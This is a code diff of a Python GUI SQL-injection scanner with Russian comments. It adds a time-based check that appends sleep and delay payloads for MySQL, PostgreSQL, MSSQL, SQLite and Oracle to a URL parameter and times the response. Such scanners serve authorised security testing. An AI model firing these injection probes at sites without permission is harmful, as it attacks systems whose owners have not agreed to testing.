@@ -198,7 +198,7 @@ def is_vulnerable(response: requests.models.Response) -> bool:
                 # Возвращаем True при условии получении ошибки
                 try:
                     if error in response.content.decode(encoding).lower():
-                        print(f'{encoding = }')
+                        print(f'{encoding = }, {sql = }')
                         return True
                 except Exception:
                     continue
@@ -226,8 +226,11 @@ def scan_sql_injection(url: str) -> (bool, str) or (str, str):
         # Делаем HTTP запрос с отловом ошибок
         try:
             res = s.get(new_url)
-        except:
+        except Exception:
             return False, "Ошибка запроса"
+        except BaseException:
+            return False, "Ошибка запроса"
+
         if is_vulnerable(res):
             # Если словили ошибку, значит SQLI допустима -> дальнейшие проверки не требуются,
             print("[+] SQL Injection vulnerability detected, link:", new_url)
@@ -314,7 +317,7 @@ class Widget(QWidget):
         self.__ui.lineEdit_Url.setText(text)
 
     def __set_label_Status(self, text: str) -> None:
-        self.__ui.label_Status.setText("Статус: " + text)
+        self.__ui.label_Status.setText("Status: " + text)
 
     def __set_progress_bar(self, value: int) -> None:
         self.__ui.progressBar.setValue(value)
@@ -365,7 +368,47 @@ class Widget(QWidget):
             return False
         return True
 
-    # Error-based тестирование с предварительной валидацией URL
+    # Time-based тестирование
+    def __time_based_check(self, sleep):
+        delay_set = (
+            # MySQL
+            "sleep(~)",
+            "SLEEP(~)",
+            "BENCHMARK(~)",
+
+            # PostgreSQL
+            "PG_SLEEP (~)",
+
+            # MSSQL
+            "WAITFOR DELAY '00:00:0~'",
+
+            # SQLite3
+            "sqlite3_sleep(~)",
+
+            # Oracle
+            'dbms_pipe.receive_message("test", ~)'
+        )
+
+        where_id = self.__url.rfind('=') + 1
+        if where_id != 0:
+            base_url = self.__url[0:where_id]
+        else:
+            base_url = self.__url + '?id='
+
+        for payload in delay_set:
+            payload = payload.replace('~', str(sleep))
+            url = base_url + payload
+            req = requests.get(url)
+            run = req.elapsed.total_seconds()
+            if run > sleep:
+                return True
+            else:
+                continue
+            time.sleep(0.1)
+        return False
+
+    # Вызов методов из самописного модуля для error-based тестирования с предварительной валидацией URL
+    # С последующим вызовом time-based тестирования при необходимости
     def __error_based_check(self) -> None:
         self.__url = self.__validate_url()
         if self.__url is False:
@@ -377,6 +420,14 @@ class Widget(QWidget):
         url, status = scan_sql_injection(self.__url)
         self.__set_label_Status(status if url is False else f"Инъекция возможна, ошибка получена после < {status} >")
         self.__error_object = '[Ошибка отсутствует]' if url is False else f'[Ошибку вызвал знак < {status} >]'
+        self.__set_progress_bar(50)
+
+        if url is False:
+            self.__set_label_Status("Запущен альтернативный способ тестирования")
+            url = self.__time_based_check(sleep=2)
+            print(url)
+            self.__set_label_Status('URL Чист' if url is False else f"Инъекция возможна, получена задержка")
+            self.__error_object = '[Задержка отсутствует]' if url is False else '[Получена задержка]'
 
         self.__feedback = url
         self.__set_progress_bar(100)
